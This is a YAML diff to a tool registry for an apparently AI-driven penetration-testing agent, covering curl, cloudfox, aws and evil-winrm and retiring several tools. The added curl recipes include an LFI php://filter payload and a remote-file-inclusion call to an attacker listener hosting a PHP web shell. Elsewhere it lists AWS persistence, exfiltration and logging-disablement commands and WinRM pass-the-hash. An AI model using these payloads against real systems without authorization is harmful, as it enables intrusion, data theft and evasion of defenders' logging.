@@ -1,5 +1,5 @@
 version: '2.0'
-updated_at: '2026-05-17T20:09:36Z'
+updated_at: '2026-05-18T10:58:33Z'
 tools:
   amass:
     name: amass
@@ -14,8 +14,8 @@ tools:
       the target. Active enum (`-active`) layers in DNS brute-force, attempted zone transfers, certificate crawling — directly
       hits the target''s resolvers. Output: text (`-o`, one subdomain per line), JSON (`-json`, structured records preferred
       for tooling), or all formats with a prefix (`-oA`). Native CLI; the LLM constructs the full amass invocation including
-      the required sub-command. For port scanning of discovered hosts use nmap; for tech fingerprinting use web-fingerprint;
-      for email/people OSINT use theharvester.'
+      the required sub-command. For port scanning of discovered hosts use nmap; for tech fingerprinting use nuclei (-as /
+      -tags tech); for email/people OSINT use theharvester.'
     image: ghcr.io/silicon-works/mcp-tools-amass:latest
     image_size_mb: 226
     idle_timeout_seconds: 600
@@ -44,7 +44,7 @@ tools:
       - track changes in subdomain inventory across engagements
       never_use_for:
       - port scanning discovered hosts (use nmap)
-      - web technology fingerprinting (use web-fingerprint)
+      - web technology fingerprinting (use nuclei -as / -tags tech)
       - web vulnerability scanning (use nuclei or nikto)
       - email harvesting (use theharvester)
       - DNS record lookup for known hosts (use the dns tool, dig, or nmap)
@@ -71,12 +71,11 @@ tools:
     see_also:
     - tool: nmap
       reason: After discovering subdomains with amass, use nmap to port-scan the resolved hosts.
-    - tool: web-fingerprint
-      reason: Use web-fingerprint to identify technologies running on discovered subdomains.
     - tool: theharvester
       reason: Use theharvester for email/employee/people harvesting — amass focuses on subdomains, theharvester on identities.
     - tool: nuclei
-      reason: After discovering subdomains, scan them with nuclei for known CVEs and misconfigurations.
+      reason: 'After discovering subdomains, scan them with nuclei: -as / -tags tech to identify the technology stack (the
+        role the retired web-fingerprint filled), plus CVE/misconfig templates for known vulnerabilities.'
     - tool: ffuf
       reason: After discovering subdomains, use ffuf for directory and content discovery on each.
     - tool: dns
@@ -350,9 +349,9 @@ tools:
       any AWS CLI command, single or batch up to 20, supports `--region *` for cross-region scans) and `suggest_aws_commands`
       (NL fallback — NOTE: hits AWS Labs HTTPS endpoint with query text, OPSEC-leaky, agent should prefer call_aws). Optional
       3rd tool `get_execution_plan` unlocks if EXPERIMENTAL_AGENT_SCRIPTS=true. The agent''s PRIMITIVE for AWS API access
-      on cloud engagements — every other AWS-related tool (pacu/cloudfox/prowler/s3scanner) sits on top of the same boto3
-      chain conceptually but exposes narrower read-only or pre-canned surfaces; aws is the only one that supports arbitrary
-      writes (privesc, persistence, exfil, defense evasion calls).'
+      on cloud engagements — every other AWS-related tool (cloudfox/prowler/s3scanner) sits on top of the same boto3 chain
+      conceptually but exposes narrower read-only or pre-canned surfaces; aws is the only one that supports arbitrary writes
+      (privesc, persistence, exfil, defense evasion calls).'
     source: https://github.com/awslabs/mcp/tree/main/src/aws-api-mcp-server
     image: ghcr.io/silicon-works/mcp-tools-aws:latest
     image_size_mb: 347
@@ -406,7 +405,6 @@ tools:
       - cross-region asset enumeration via --region *
       never_use_for:
       - cloud security auditing/compliance (use prowler — runs hundreds of CIS/NIST/PCI checks)
-      - IAM privilege escalation analysis (use pacu — has 21+ privesc modules pre-built)
       - attack path analysis (use cloudfox — cross-service trust-chain correlation)
       - S3 bucket brute-force discovery from outside an account (use s3scanner)
       - secret scanning in S3 contents (use trufflehog)
@@ -431,9 +429,6 @@ tools:
       prefer_over:
       - prowler
     see_also:
-    - tool: pacu
-      reason: aws gives raw API access. pacu encodes exploitation knowledge — 21+ IAM privesc paths, persistence modules,
-        evasion techniques. Use aws for manual enumeration + write ops, pacu for automated exploitation patterns.
     - tool: cloudfox
       reason: aws makes individual API calls. cloudfox does cross-service attack-path analysis (trust chains, role assumptions,
         env-var secrets in instance metadata). Use cloudfox for situational awareness, then aws to execute discovered attack
@@ -496,7 +491,7 @@ tools:
       \ |\n| Lateral movement | `aws sts assume-role`, `aws ssm send-command`, `aws ec2-instance-connect send-ssh-public-key`\
       \ |\n| Persistence | `aws iam create-login-profile`, `aws lambda create-function`, `aws events put-rule` |\n| Data exfiltration\
       \ | `aws s3 sync s3://bucket /local/`, `aws dynamodb scan`, `aws ec2 create-snapshot` |\n| Defense evasion | `aws cloudtrail\
-      \ stop-logging`, `aws guardduty disable-organization-admin-account` |\n\nNone of pacu/cloudfox/prowler can do the write-side\
+      \ stop-logging`, `aws guardduty disable-organization-admin-account` |\n\nNone of cloudfox/prowler can do the write-side\
       \ phases — those require `aws`.\n"
     methods:
       call_aws:
@@ -2547,8 +2542,8 @@ tools:
       \ AND filesystem artifacts to `--output-directory` (\"loot files\" — text/CSV per service). Default output dir is ~/.cloudfox/cloudfox-output/<account-id>/<service>/.\
       \ For OpenSploit, ALWAYS pass `--output-directory=/session/output/cloudfox/` to keep loot under the engagement working\
       \ dir.\nPhase: enumeration / post-exploitation (after AWS credentials obtained). Read-only — cloudfox does NOT modify\
-      \ any AWS resource. For exploitation use pacu. For raw AWS API access use the aws CLI.\nFeature 28 dynamic recipes are\
-      \ RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls (run, list_commands)\
+      \ any AWS resource. For exploitation and raw AWS API access use the aws CLI.\nFeature 28 dynamic recipes are RETIRED\
+      \ for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls (run, list_commands)\
       \ if /session/tool_recipes/cloudfox/ exists, but they're a dead branch under run_cli (REQ-TR-016).\n"
     image: ghcr.io/silicon-works/mcp-tools-cloudfox:latest
     image_size_mb: 350
@@ -2573,8 +2568,8 @@ tools:
       - Azure / GCP / Kubernetes post-exploitation enumeration (smaller sub-command surface)
       - analyze cross-account trust relationships and resource sharing for lateral movement opportunities
       never_use_for:
-      - executing AWS API write operations or exploitation (use the aws CLI or pacu)
-      - exploiting AWS misconfigurations (privesc, persistence, evasion — use pacu)
+      - executing AWS API write operations or exploitation (use the aws CLI)
+      - exploiting AWS misconfigurations (privesc, persistence, evasion — use the aws CLI)
       - S3 bucket brute-force from outside (use s3scanner)
       - secret scanning in source code or filesystems (use trufflehog)
       - AWS compliance / CIS-benchmark checks (use prowler)
@@ -2633,9 +2628,6 @@ tools:
     - tool: aws
       reason: 'cloudfox does READ-ONLY cross-service attack-path enumeration. The aws CLI provides interactive AWS API access
         for exploitation, write operations, and arbitrary calls. Workflow: cloudfox enumerates → aws CLI exploits.'
-    - tool: pacu
-      reason: cloudfox identifies attack paths (workloads with admin, exposed env-var secrets, trust relationships). pacu
-        EXPLOITS them (privesc modules, persistence, evasion). Sequential pairing.
     - tool: prowler
       reason: 'Both analyze AWS but with different goals: prowler runs CIS/PCI/NIST compliance checks (defensive). cloudfox
         finds OFFENSIVE attack paths (post-exploitation perspective). For pentest reports, run BOTH — prowler frames the defensive
@@ -2864,8 +2856,8 @@ tools:
       For non-interactive runs, ALWAYS pass `-y`. The mcp-server.py wraps this implicitly; the new kind:cli path requires
       it explicitly.'
     - AZURE / GCP / K8S COVERAGE IS SMALLER — the AWS sub-command surface is ~30+; Azure is ~5; GCP is ~6; k8s is ~4. For
-      deep cloud-platform analysis on non-AWS, the relevant native CLIs (az, gcloud, kubectl) plus pacu-equivalents may be
-      more thorough. cloudfox is BEST for AWS.
+      deep cloud-platform analysis on non-AWS, the relevant native CLIs (az, gcloud, kubectl) may be more thorough. cloudfox
+      is BEST for AWS.
     - Feature 28 dynamic recipes are RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for
       legacy method calls (run, list_commands) if /session/tool_recipes/cloudfox/ exists, but they're a dead branch under
       run_cli (REQ-TR-016).
@@ -2968,7 +2960,8 @@ tools:
       web-layer pentesting: send arbitrary requests with custom methods/headers/bodies, deliver RCE payloads, upload web shells
       via multipart, download files (text or binary). Supports cookies, auth (basic/digest/NTLM/negotiate), redirect following,
       proxy chains, SSL bypass, certificate auth, and per-step timing instrumentation. The native CLI; LLM constructs the
-      full curl invocation. Use playwright for JavaScript-rendered pages or web-session for stateful login flows.'
+      full curl invocation. Use playwright for JavaScript-rendered pages; for stateful login flows curl is itself the answer
+      — drive a login with `-c` to write a cookie jar, then `-b` it back on subsequent calls.'
     image: ghcr.io/silicon-works/mcp-tools-curl:latest
     image_size_mb: 100
     idle_timeout_seconds: 60
@@ -3005,7 +2998,6 @@ tools:
       never_use_for:
       - directory or parameter brute-forcing — use ffuf
       - rendering JavaScript-heavy pages — use playwright
-      - stateful multi-request login flows — use web-session
       - automated vulnerability scanning — use nuclei or zap
       - cracking HTTP basic auth via wordlist — use hydra
       triggers:
@@ -3032,8 +3024,6 @@ tools:
       memory_mb: 64
       cpu: 0.25
     see_also:
-    - tool: web-session
-      reason: For stateful authenticated multi-request flows requiring cookie persistence
     - tool: playwright
       reason: For JavaScript-rendered pages or DOM interaction
     - tool: ffuf
@@ -3132,6 +3122,68 @@ tools:
         HTTP 500 or a different response than for {"{param}":"x"}, the field is unsafely interpolated and operator injection
         is exploitable. Use after nuclei NoSQL templates flag a candidate, before committing to full auth-bypass / exfiltration
         runs
+    - name: LFI source disclosure via php://filter (replaces retired lfi-rfi php_filter)
+      command: curl -sS -o {output} '{url}?{param}=php://filter/convert.base64-encode/resource={target_file}'
+      when: Read PHP source (which a plain LFI would execute, not show) by base64-encoding it through php://filter. {target_file}
+        e.g. 'index.php', 'config.php', '../config/database.php'. The response body carries a base64 blob — decode it with
+        `base64 -d`. YOU pick which blob from the response to decode — more reliable than the retired lfi-rfi's regex that
+        grabbed the first 20+ char base64-ish string (could be a CSRF token / session id). For non-UTF8 or filtered reads,
+        chain convert.iconv filters.
+    - name: RFI via attacker-hosted payload + callback listener (replaces retired lfi-rfi test_rfi)
+      command: curl -sS -o {output} '{url}?{param}=http://{listener_ip}:{listener_port}/shell.txt'
+      when: 'CORRECT RFI verification: point the include parameter at an attacker-controlled URL and confirm via a listener
+        that ACTUALLY RECEIVED the request — NOT by inspecting the response body. Run the listener first (nc -lvnp {port},
+        python3 -m http.server, or tools/responder) hosting shell.txt = ''<?php system($_GET["c"]); ?>''. Listener logs a
+        hit → RFI confirmed + PHP executed server-side. The retired lfi-rfi test_rfi used `status==200 and len(body)>0` which
+        produces false positives — this listener method is the accurate technique. RFI requires allow_url_include=On (PHP).
+        When remote-URL fetch is filtered, data:// is the LFI-side alternative: ?{param}=data://text/plain;base64,<b64-of-php>'
+    - name: Authenticated session flow via persistent cookie jar (replaces retired web-session)
+      command: curl -skL -c /session/cookies/{name}.txt -d '{login_form_body}' '{login_url}' && curl -skL -b /session/cookies/{name}.txt
+        -c /session/cookies/{name}.txt -o {output} '{protected_url}'
+      when: 'Stateful login then reuse the session — the role web-session used to fill. Call 1 posts the form (-d ''username=admin&password=pass'';
+        use --data-urlencode for values with special chars); -c writes Set-Cookie into a Netscape jar under /session/cookies/.
+        -L follows the post-login redirect (logins almost always 302 to a dashboard; without -L you miss the landing page
+        and any cookie set on the redirect — web-session''s urllib followed redirects by default). -k ignores TLS cert errors
+        (web-session did ssl.CERT_NONE by default — pentest targets routinely have self-signed/expired certs). Reuse calls
+        pass BOTH -b jar -c jar so a rotated/upgraded post-login session cookie is written back (web-session auto-merged new
+        Set-Cookie on every request; a bare -b would pin a stale pre-auth session id). The jar feeds curl''s own -b directly;
+        OTHER tools want the cookie STRING not the jar file — derive it: awk ''NF>=7{printf "%s=%s; ",$6,$7}'' /session/cookies/{name}.txt
+        then feed ffuf -b / sqlmap --cookie / nuclei -H ''Cookie: ...'' (nikto -id is HTTP basic-auth, a separate mechanism).
+        CSRF: fetch the form and grep the token in one shot — `curl -skL -b jar -c jar URL | grep -oP ''name="csrf_token"
+        value="\K[^"]+''` — then put it in the next -d body, keeping -b/-c on the same jar so cookie+token stay paired. Common
+        token variants web-session matched: Django name="csrfmiddlewaretoken", <meta name="csrf-token" content="...">, JSON
+        "csrf_token":"...", and reversed value="..." ... name="csrf..." attribute order — adjust the regex per target. For
+        JavaScript-rendered / OAuth / MFA logins curl cannot execute (no JS engine) — use playwright, then export its cookies
+        into a jar.'
+    - name: Online pre-cracked hash lookup before offline cracking (replaces retired hash-lookup)
+      command: curl -sS 'https://www.nitrxgen.net/md5db/{hash}'
+      when: 'FIRST move for UNSALTED hashes (MD5/SHA1/NTLM) before burning john/hashcat CPU — public pre-cracked DBs answer
+        in ~1-3s. Query free sources, stop at first non-empty hit: (1) nitrxgen, MD5 only, fastest: `curl -sS https://www.nitrxgen.net/md5db/<hash>`
+        — a non-empty response body IS the plaintext. (2) hashtoolkit, MD5/SHA1/SHA256, HTML scrape: `curl -sS ''https://hashtoolkit.com/reverse-hash?hash=<hash>''
+        | grep -oP ''class="res-text"[^>]*>\K[^<]+''`. (3) hashes.com: the FREE /en/api/identifier endpoint only identifies
+        hash TYPE, it does NOT return plaintext — the retired hash-lookup tool wrongly parsed it for a `plaintext` field and
+        so never actually worked; the real cracked lookup is the PAID https://hashes.com/en/api/search (requires an API key
+        + account credits) — only use with a key. HARD LIMITS: online DBs only hold UNSALTED hashes — Linux $6$, bcrypt $2a$/$2b$,
+        sha512crypt, scrypt, argon2 will NEVER be found, skip straight to john/hashcat. A 32-hex string is ambiguous MD5-vs-NTLM
+        (Windows/SAM source ⇒ NTLM, web app ⇒ usually MD5). Batch = a shell loop over the per-hash call. Hash TYPE identification:
+        prefer john''s identify (john format names are more definitive than length heuristics). To GENERATE a hash for match-verification:
+        md5/sha1/sha256/sha512 via coreutils (`printf %s ''pw'' | sha256sum`) or `openssl dgst -sha256`; NTLM is MD4(UTF-16LE)
+        and modern OpenSSL3 disables md4 in hashlib — use impacket `python3 -c "from impacket.ntlm import compute_nthash;
+        from binascii import hexlify; print(hexlify(compute_nthash(''pw'')).decode())"` or passlib `nthash.hash(''pw'')`.
+        All three lookup services are third-party: a miss is INCONCLUSIVE (service down / HTML changed), not proof the hash
+        is uncracked.'
+    - name: HTTP header + security-header recon (replaces retired web-fingerprint headers/security_headers)
+      command: curl -skSL -D - -o /dev/null '{url}'
+      when: 'Dump and read ALL response headers (-D - prints them, -o /dev/null discards the body, -k skip cert, -L follow
+        redirects, -s quiet). Server / X-Powered-By / X-AspNet-Version / X-Generator / X-Gitlab-* are the highest-signal version
+        disclosure — read them directly. Security-header audit (the retired web-fingerprint security_headers method was just
+        a checklist — do it by eye): FLAG missing/weak Strict-Transport-Security (no HSTS ⇒ SSL-strip; max-age < 31536000
+        is weak), Content-Security-Policy (missing ⇒ XSS leverage), X-Frame-Options (missing or not DENY/SAMEORIGIN ⇒ clickjacking),
+        X-Content-Type-Options (missing ⇒ MIME sniffing), Referrer-Policy, Permissions-Policy; on Set-Cookie note missing
+        HttpOnly/Secure/SameSite. For SYSTEMATIC tech/CMS fingerprinting (the retired web-fingerprint fingerprint method)
+        use nuclei `-as` (Wappalyzer-style auto-detect) or `-tags tech` (~810 templates, far more than web-fingerprint''s
+        ~40 hand-rolled sigs); for the Shodan favicon-hash pivot use exploit-runner''s favicon-mmh3 pattern. Quick CMS sniff
+        one-liner: `curl -skSL ''{url}'' | grep -Eio ''wp-content|wp-includes|/sites/default/files|Drupal.settings|com_content|laravel_session|csrfmiddlewaretoken|__VIEWSTATE''`.'
     output_formats:
     - flag: -o {path}
       format: body_to_file
@@ -3278,232 +3330,6 @@ tools:
       purpose: Version and feature support (HTTP/2, HTTP/3, NTLM, Kerberos, libssh, etc.)
     - command: curl --help category
       purpose: List flag categories (auth, dns, http, output, etc.)
-  cve-lookup:
-    name: cve-lookup
-    version: '1.0'
-    description: CVE vulnerability research tool using the NVD (National Vulnerability Database) API v2.0. Provides detailed
-      CVE lookups with CVSS v3.1/v3.0/v2 scoring, affected product versions (CPE matching), CWE weakness classification, and
-      reference links. Includes keyword-based CVE search with built-in CPE mapping for 22 common products (Apache, Nginx,
-      OpenSSH, MySQL, PostgreSQL, WordPress, etc.), version filtering, severity filtering, and year filtering. Also finds
-      exploit references (ExploitDB, GitHub PoCs, PacketStorm, Metasploit) from NVD reference links. Supports optional NVD_API_KEY
-      environment variable for higher rate limits (50 req/30s vs 5 req/30s).
-    image: ghcr.io/silicon-works/mcp-tools-cve-lookup:latest
-    image_size_mb: 100
-    timeout_seconds: 60
-    capabilities:
-    - cve_lookup
-    - vulnerability_search
-    - exploit_research
-    - cvss_scoring
-    phases:
-    - enumeration
-    - exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    routing:
-      use_for:
-      - look up CVE details including CVSS score and affected versions
-      - search for CVEs affecting a specific product and version
-      - find public exploits and PoCs for a CVE
-      - check CVSS severity score for a vulnerability
-      - find recent critical CVEs from the last week
-      - research vulnerabilities for identified services
-      - determine affected version range for a CVE
-      - get CWE weakness classification for a vulnerability
-      never_use_for:
-      - active vulnerability scanning (use nuclei or nmap vuln)
-      - exploit execution (use exploit-runner or metasploit)
-      - port scanning (use nmap)
-      - finding exploit code (use searchsploit for actual code)
-      triggers:
-      - CVE
-      - vulnerability lookup
-      - NVD
-      - exploit search
-      - CVSS
-      - vulnerability research
-      - what is CVE
-      - affected versions
-      prefer_over:
-      - searchsploit
-    environment:
-      NVD_API_KEY:
-        description: Optional NVD API key for higher rate limits
-        required: false
-    methods:
-      lookup:
-        description: 'Look up a specific CVE by ID from the NVD API v2.0. Returns comprehensive vulnerability details: English
-          description, CVSS base score with severity rating (prefers v3.1 → falls back to v3.0 → v2.0), CVSS vector string
-          for attack complexity analysis, affected products with vendor/product/version ranges parsed from CPE matching data,
-          CWE weakness classification IDs, publication and last-modified dates, and up to 10 reference links (advisories,
-          patches, PoCs). Automatically normalizes the CVE ID — accepts ''CVE-2024-32019'', ''cve-2024-32019'', or ''2024-32019''.'
-        when_to_use: 'When you have a CVE ID and need to understand the vulnerability before exploitation. Common sources
-          of CVE IDs: (1) nmap scripts (vuln, http-vuln-*) output CVE references, (2) nuclei scanner results include CVE IDs,
-          (3) searchsploit results reference CVEs, (4) web application error pages or headers reveal version-specific CVEs.
-          Use lookup to get: CVSS score for severity triage (CRITICAL ≥9.0 first), affected version ranges to confirm the
-          target is vulnerable, CWE classification to understand the vulnerability class (e.g., CWE-79 = XSS, CWE-89 = SQLi),
-          and reference links that may point to patches, advisories, or PoC code.'
-        params:
-          cve_id:
-            type: string
-            required: true
-            description: CVE ID in any format — 'CVE-2024-32019', 'cve-2024-32019', or bare '2024-32019'. The CVE- prefix
-              and uppercase are applied automatically. Must be a valid CVE ID that exists in NVD.
-        returns:
-          cve_id:
-            type: string
-            description: Normalized CVE identifier (uppercase with CVE- prefix)
-          description:
-            type: string
-            description: English vulnerability description from NVD
-          cvss_score:
-            type: number
-            description: CVSS base score (0.0-10.0). Null if no CVSS data available (rare for recent CVEs)
-          cvss_severity:
-            type: string
-            description: 'Severity level: LOW (0.1-3.9), MEDIUM (4.0-6.9), HIGH (7.0-8.9), CRITICAL (9.0-10.0)'
-          cvss_vector:
-            type: string
-            description: CVSS vector string (e.g., 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H') — describes attack vector,
-              complexity, privileges, and impact
-          affected_products:
-            type: array
-            description: Up to 10 affected products parsed from CPE data, each with vendor, product, version_start (inclusive),
-              and version_end (exclusive or inclusive). Use to confirm target version falls within the vulnerable range.
-          weaknesses:
-            type: array
-            description: CWE IDs (e.g., 'CWE-79', 'CWE-89') classifying the vulnerability type
-          references:
-            type: array
-            description: Up to 10 reference links with URL, source, and tags (Patch, Exploit, Vendor Advisory, Third Party
-              Advisory, etc.)
-      search:
-        description: 'Search NVD for CVEs matching a keyword with optional version, severity, and year filters. Uses NVD''s
-          keywordSearch API which matches against CVE descriptions and product names. Returns a summary list of matching CVEs
-          — each with CVE ID, CVSS score, severity, truncated description (300 chars), and publication date. Client-side version
-          filtering compares the specified version against CPE version ranges (simple string comparison, not semver). Results
-          capped at 100 from the API, further limited by the limit parameter. NVD rate limits apply: 5 requests per 30 seconds
-          without API key, 50 with API key.'
-        when_to_use: 'The standard workflow after nmap service_scan identifies software versions — search by product name
-          to find known CVEs. Examples: after nmap finds ''Apache httpd 2.4.49'', search keyword=''apache'' version=''2.4.49''.
-          After finding ''OpenSSH 7.2p2'', search keyword=''openssh'' version=''7.2''. Search tips: (1) Use simple product
-          names: ''apache'' not ''Apache httpd 2.4.49 (Ubuntu)''. (2) Combine with severity=''CRITICAL'' or severity=''HIGH''
-          to prioritize exploitable vulns. (3) Use year filter to focus on recent CVEs (older CVEs are more likely patched).
-          (4) Version filtering is approximate — review results manually to confirm applicability. (5) For a specific CVE
-          found in results, use lookup for full details. (6) Follow up with exploits method to check for public exploit code.'
-        params:
-          keyword:
-            type: string
-            required: true
-            description: 'Product name or keyword to search. Use simple product names for best results: ''apache'', ''nginx'',
-              ''openssh'', ''wordpress'', ''mysql'', ''postgresql'', ''tomcat'', ''jenkins'', ''redis'', ''elasticsearch'',
-              ''drupal'', ''joomla'', ''php''. NVD matches against CVE descriptions, so general terms like ''buffer overflow''
-              or ''remote code execution'' also work but return very broad results.'
-          version:
-            type: string
-            description: Product version for client-side filtering against CPE version ranges. Simple string comparison (not
-              semver) — '2.4.49' is compared against versionStartIncluding/versionEndExcluding ranges. Omit the version to
-              see all CVEs for the product, then filter manually.
-          severity:
-            type: enum
-            values:
-            - LOW
-            - MEDIUM
-            - HIGH
-            - CRITICAL
-            description: Filter by CVSS v3 severity. During pentesting, start with CRITICAL to find the most exploitable vulns,
-              then expand to HIGH if nothing actionable. MEDIUM and LOW are rarely worth pursuing unless no higher-severity
-              options exist.
-          limit:
-            type: integer
-            default: 20
-            description: Maximum results to return (1-100). NVD API caps at 100 per request. Default 20 is usually sufficient
-              — increase if searching broad terms like 'apache' where relevant results may be buried.
-          year:
-            type: integer
-            description: Filter by publication year (e.g., 2024). Useful to focus on recent CVEs which are more likely to
-              lack patches or have public exploits. Also useful for CTFs where challenge authors use CVEs from specific years.
-        returns:
-          cves:
-            type: array
-            description: 'Matching CVEs, each with: cve_id, cvss_score, cvss_severity, description (truncated to 300 chars),
-              published date'
-          total_results:
-            type: integer
-            description: Total matching CVEs in NVD (may be much larger than returned results — increase limit or add filters
-              to narrow)
-      recent:
-        description: Get CVEs published in the last 7 days from NVD. Returns the same summary format as search — CVE ID, CVSS
-          score, severity, truncated description, and publication date. Queries NVD with pubStartDate/pubEndDate for the last
-          7-day window. Useful for zero-day awareness and checking if recently disclosed vulnerabilities affect identified
-          targets. NVD rate limits apply.
-        when_to_use: 'Two main scenarios: (1) At the start of an engagement, check for freshly disclosed CVEs in the target''s
-          technology stack — recent CVEs are more likely unpatched. Filter by severity=''CRITICAL'' for the most impactful.
-          (2) During long-running engagements, periodically check for new disclosures that may open new attack paths. Note:
-          NVD publication can lag 24-72 hours behind the original disclosure, so very new vulnerabilities may not appear yet.'
-        params:
-          severity:
-            type: enum
-            values:
-            - LOW
-            - MEDIUM
-            - HIGH
-            - CRITICAL
-            description: Filter by CVSS v3 severity. Use CRITICAL to find the most impactful recent disclosures. Without this
-              filter, results include all severities including LOW which are rarely actionable.
-          limit:
-            type: integer
-            default: 20
-            description: Maximum results (1-100). 20 is usually sufficient for a weekly snapshot. Increase to 50-100 if filtering
-              by CRITICAL severity, as there are typically few critical CVEs per week.
-        returns:
-          cves:
-            type: array
-            description: 'Recent CVEs from last 7 days, each with: cve_id, cvss_score, cvss_severity, description (truncated
-              to 300 chars), published date'
-          total_results:
-            type: integer
-            description: Total recent CVEs in the 7-day window (before severity filtering)
-      exploits:
-        description: 'Find known public exploits for a CVE by scanning its NVD reference links. Checks references for exploit-related
-          indicators: ExploitDB URLs, GitHub repositories containing ''exploit'', ''poc'', or ''CVE'' in the path, PacketStorm
-          URLs, 0day.today URLs, and Rapid7/Metasploit references. Also checks NVD''s reference tags for the ''Exploit'' tag.
-          Returns matching exploit URLs grouped by source, plus ready-to-use follow-up commands: a searchsploit query (CVE
-          number without ''CVE-'' prefix) and a Metasploit ''search cve:'' command. Note: this only finds exploits linked
-          from NVD references — it does NOT search ExploitDB or GitHub directly. For comprehensive exploit search, follow
-          up with the searchsploit tool.'
-        when_to_use: 'After search or lookup identifies a CVE that affects the target, use this to determine if public exploit
-          code exists before attempting manual exploitation. The workflow: (1) search for CVEs → (2) exploits to check for
-          PoCs → (3) if ExploitDB found, use searchsploit get_exploit to retrieve the code → (4) if Metasploit found, use
-          metasploit tool → (5) if GitHub PoC found, the URL is returned for manual review. This is a quick triage step —
-          if no exploit references are found in NVD, the CVE may still have exploits that aren''t linked from NVD. Always
-          follow up with searchsploit for a more thorough search.'
-        params:
-          cve_id:
-            type: string
-            required: true
-            description: 'CVE ID to search exploits for. Accepts any format: ''CVE-2021-44228'', ''cve-2021-44228'', or ''2021-44228''.
-              Normalized automatically.'
-        returns:
-          exploit_references:
-            type: array
-            description: URLs to exploit code or PoCs, each with url, source, and tags. Empty array if no exploit references
-              found in NVD.
-          exploit_sources:
-            type: array
-            description: 'Deduplicated list of sources with exploits: ''ExploitDB'', ''GitHub'', ''Metasploit'', ''PacketStorm''.
-              Empty if none found.'
-          searchsploit_query:
-            type: string
-            description: Ready-to-use query for the searchsploit tool's --cve flag (e.g., '2021-44228' for CVE-2021-44228).
-              Use with searchsploit search.
-          metasploit_search:
-            type: string
-            description: Ready-to-use Metasploit search command (e.g., 'search cve:CVE-2021-44228'). Use with metasploit tool.
   dns:
     name: dns
     kind: cli
@@ -4556,23 +4382,30 @@ tools:
       purpose: Same — short form.
   evil-winrm:
     name: evil-winrm
-    version: 2.0.0
-    description: 'WinRM shell for Windows remote management using pypsrp v0.8+ (Python PowerShell Remoting Protocol). 3 methods:
-      exec (native PowerShell via PSRP plugin URI, or CMD via WinRS), upload (native PSRP copy), download (native PSRP fetch).
-      pypsrp uses the PowerShell plugin URI directly — works for non-admin WinRM users on Windows Server 2025 where CMD Invoke
-      is restricted. Supports NTLM pass-the-hash via pyspnego auto-detection of LM:NT hash format — bare NT hashes auto-prefixed
-      with 32 zero bytes. Connects via HTTP (5985) or HTTPS (5986) using NTLM transport. WinRM requires membership in ''Remote
-      Management Users'' or ''Administrators'' group.'
+    kind: cli
+    binary: winrm-exec
+    version: 3.0.0
+    description: 'WinRM/PSRP remote command execution + file transfer via the `winrm-exec` CLI (pypsrp-backed). kind:cli flip
+      May 2026 from a 402-LOC kind:mcp wrapper. Three actions on one invocation: `--command` (exec via PowerShell PSRP plugin
+      URI, or `--shell cmd` via WinRS), `--upload LOCAL:REMOTE` (native PSRP copy), `--download REMOTE[:LOCAL]` (native PSRP
+      fetch). Auth: `--password` (NTLM), `--hash` (NTLM pass-the-hash; bare NT auto-prefixed with 32 zero bytes, or full LM:NT),
+      or `--ccache` (Kerberos via ccache). **Distinct from `netexec winrm` which is NTLM-only — this is the only tool in the
+      registry that does Kerberos-authenticated WinRM**, the common case in hardened/NTLM-disabled AD. pypsrp uses the PowerShell
+      plugin URI directly, so it works for non-admin WinRM users on Windows Server 2025 where the CMD WinRS Invoke URI is
+      restricted. WinRM requires the principal be in ''Remote Management Users'' or ''Administrators''. Single JSON object
+      on stdout; classified error + suggestions also on stderr.'
     image: ghcr.io/silicon-works/mcp-tools-evil-winrm:latest
-    image_size_mb: 300
-    timeout_seconds: 300
-    idle_timeout: 1800
+    image_size_mb: 464
+    idle_timeout_seconds: 600
+    max_runtime_seconds: 600
+    timeout_seconds: 600
     capabilities:
     - winrm_shell
     - file_transfer
     - powershell_execution
     - cmd_execution
     - pass_the_hash
+    - kerberos_winrm
     phases:
     - exploitation
     - post-exploitation
@@ -4584,225 +4417,183 @@ tools:
       cpu: 0.5
     routing:
       use_for:
-      - WinRM command execution with PowerShell or CMD
-      - Windows remote PowerShell script execution via WinRM
-      - file upload to Windows target via WinRM base64 chunking
-      - file download from Windows target via WinRM base64 encoding
-      - pass-the-hash remote execution via WinRM NTLM
-      - evil-winrm alternative for non-interactive command execution
-      - post-exploitation command execution when WinRM (5985) is open
+      - WinRM command execution (PowerShell PSRP, or CMD via WinRS)
+      - Windows remote PowerShell execution via WinRM on a single target
+      - Kerberos-authenticated WinRM (NTLM disabled / hardened AD) — the unique capability vs netexec winrm
+      - file upload to a Windows target via native PSRP copy
+      - file download / loot retrieval from a Windows target via native PSRP fetch
+      - pass-the-hash remote execution over WinRM
+      - non-admin WinRM on Windows Server 2025 (PSRP plugin URI, not CMD WinRS)
+      - post-exploitation command execution when WinRM (5985/5986) is open
       never_use_for:
-      - Linux targets (WinRM is Windows-only)
+      - Linux targets (WinRM is Windows-only — use ssh)
       - port scanning (use nmap)
       - vulnerability scanning (use nuclei)
-      - credential spraying across multiple targets (use netexec winrm)
-      - SMB operations (use netexec smb or impacket)
+      - credential spraying across many targets / a CIDR (use netexec winrm — built for multi-target, NTLM-only)
+      - SMB / WMI / DCOM / scheduled-task remote exec (use impacket wmiexec/psexec/smbexec/atexec/dcomexec)
+      - SAM/LSA/DPAPI credential dumping (use netexec winrm modules or impacket secretsdump)
       triggers:
       - evil-winrm
       - winrm shell
       - winrm exec
       - winrm upload
       - winrm download
-      - winrm file transfer
-      prefer_over: []
+      - winrm kerberos
+      - winrm pass-the-hash
+      prefer_over:
+      - netexec
+    target_extraction:
+    - rule: flag_value
+      flag: --target
+      parse_as: raw
+    value_flags:
+    - --domain
+    reject_flags: []
+    reject_flags_reason: winrm-exec takes exactly one --target (single host). No list/CIDR/file-of-targets flag exists — multi-target
+      credential spraying is delegated to netexec winrm (see routing.never_use_for). Nothing to reject.
+    allowed_env:
+    - KRB5CCNAME
+    - KRB5_CONFIG
+    - FAKETIME
     see_also:
-    - tool: impacket
-      reason: wmiexec/psexec/smbexec for non-WinRM remote execution via SMB/WMI/DCOM
     - tool: netexec
-      reason: Multi-protocol credential validation and WinRM command execution across multiple targets simultaneously
-    methods:
-      exec:
-        required_ports:
-        - 5985
